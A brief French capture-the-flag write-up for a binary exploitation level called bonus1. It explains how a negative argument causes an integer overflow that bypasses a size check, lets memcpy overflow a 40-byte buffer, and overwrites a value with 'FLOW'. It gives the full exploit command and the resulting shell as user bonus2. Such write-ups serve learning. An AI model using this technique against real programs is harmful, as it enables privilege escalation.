# bonus01

## Writing the payload

```bash
$ python3 -c 'import struct; print(struct.pack("<I", 1464814662))'
b'FLOW'
```

... ah les batards.

Le programme prend deux input, le premier est converti
en int et doit être inférieur a 10, le second est
mis dans un buffer[40], mais seulement notre premier int*4
charactères.
Finalement, la valeur de l'int doit être égale a 1464814662, soit "FLOW"

Nous allons utiliser un underflow pour passer la valeur de notre choix outre le if(int < 10), en donnant une valeur négative
Nous allons faire en sorte que int*4 = 44, cela correspond a INT_MIN-44/4, soit -2147483637.
On peut alors réasigner la valeur de l'int grace au memcpy() juste après.
Nous allons alors mettre FLOW (1464814662), dans notre second input jusqu'a faire 40 charactères :
```bash
./bonus1 -2147483637 "FLOWFLOWFLOWFLOWFLOWFLOWFLOWFLOWFLOWFLOWFLOW"
$ whoami
bonus2
```
